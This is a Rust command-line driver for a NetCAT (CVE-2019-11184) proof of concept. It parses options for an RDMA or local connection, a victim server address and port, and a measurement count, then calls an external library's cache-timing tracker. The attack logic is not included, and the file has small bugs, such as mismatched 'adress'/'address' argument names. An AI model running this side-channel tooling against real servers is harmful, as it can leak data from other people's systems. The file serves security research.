use clap::{crate_authors, crate_version, App, Arg};
use std::net::IpAddr;
use std::str::FromStr;

const DEFAULT_PORT: &str = "9003";
const DEFAULT_MEASUREMENT_CNT: &str = "10000";

fn main() {
    let matches = app_cli_config().get_matches();

    if matches.is_present("interactive") {
        interactive::run_session(matches);
    } else {
        uninteractive::run_session(matches);
    }
}

fn app_cli_config<'a, 'b>() -> App<'a, 'b> {
    App::new("NetCAT PoC")
        .version(crate_version!())
        .author(crate_authors!())
        .about("Implementation of the Network Cache Attack (CVE-2019-11184)")
        .arg(
            Arg::with_name("connection")
                .long("conn")
                .short("c")
                .value_name("CONNECTION_TYPE")
                .possible_values(&["rdma", "local"])
                .default_value("rdma")
                .help("Sets the connection type"),
        )
        .arg(
            Arg::with_name("adress")
                .help("Victim server adress")
                .long("addr")
                .short("a")
                .takes_value(true)
                .required_if("connection", "rdma")
                .value_name("IP_ADDR")
                .validator(|x| match IpAddr::from_str(x.as_str()) {
                    Ok(_) => Ok(()),
                    Err(_) => Err(String::from("Faulty IP adress")),
                }),
        )
        .arg(
            Arg::with_name("port")
                .help("Victim server port to be used for control packets")
                .long("port")
                .short("p")
                .takes_value(true)
                .required_if("conneciton", "rdma")
                .value_name("PORT")
                .default_value(DEFAULT_PORT)
                .validator(|x| match x.parse::<u16>() {
                    Ok(_) => Ok(()),
                    Err(_) => Err(String::from("Faulty port")),
                }),
        )
        .arg(
            Arg::with_name("measurements")
                .help("The number of measurements to be taken")
                .long("measurements")
                .short("m")
                .takes_value(true)
                .default_value(DEFAULT_MEASUREMENT_CNT)
                .value_name("MESUREMENTS")
                .validator(|num_str| match num_str.parse::<usize>() {
                    Ok(_) => Ok(()),
                    Err(_) => Err(String::from("MEAUSEMENTS should be a number")),
                }),
        )
        .arg_from_usage("[quite] -q --quite 'Does not disturb anyone by the output'")
        .arg_from_usage("[interactive] -i --interactive 'Sets the program into interactive mode'")
        .arg_from_usage("[output] 'Output file to dump data to'")
}

mod uninteractive {
    use clap::{value_t, ArgMatches};
    use get_if_addrs::get_if_addrs;
    use netcat::connection::{local::LocalMemoryConnector, rdma::RdmaServerConnector};

    pub fn run_session(args: ArgMatches) {
        let quite = args.is_present("quite");
        let port = value_t!(args.value_of("port"), u16).unwrap();
        let cnt = value_t!(args.value_of("measurements"), usize).unwrap();
        // Unwraping is ok as we have a default value
        if args.value_of("connection").unwrap() == "rdma" {
            // these are required for rdma and validated
            let ip = args.value_of("address").unwrap();
            let conn = RdmaServerConnector::new((ip, port));

            super::measurements::do_measurements((ip, port), conn, cnt, quite);
        } else {
            // this is a local scenario
            // but we still need an address for synchronization
            let ip = get_if_addrs()
                .expect("ERROR: Could not get machine network interfaces")
                .into_iter()
                .filter(|i| !i.is_loopback())
                .next()
                .expect("ERROR: no network interface found")
                .ip();
            let conn = LocalMemoryConnector::new();

            super::measurements::do_measurements((ip, port), conn, cnt, quite);
        }
    }
}

mod interactive {
    use clap::ArgMatches;
    pub fn run_session(_args: ArgMatches) {
        println!("I am interactive");
    }
}

mod measurements {
    use console::style;
    use netcat::connection::CacheConnector;
    use netcat::online_tracker;
    use netcat::rpp::Contents;
    use std::net::ToSocketAddrs;

    pub fn do_measurements<A, C>(addr: A, conn: C, cnt: usize, quite: bool)
    where
        A: ToSocketAddrs,
        C: CacheConnector<Item = Contents>,
    {
        let mut tracker = online_tracker::OnlineTracker::new(addr, conn, quite).unwrap();

        if let Err(e) = tracker.track(cnt) {
            if !quite {
                println!("Online Tracker: {}", style(e).red());
            }
        }
        if !quite {
            println!(
                "Online Tracker: {}",
                style("MEASUREMENTS COMPLETED").green()
            );
        }
    }
}
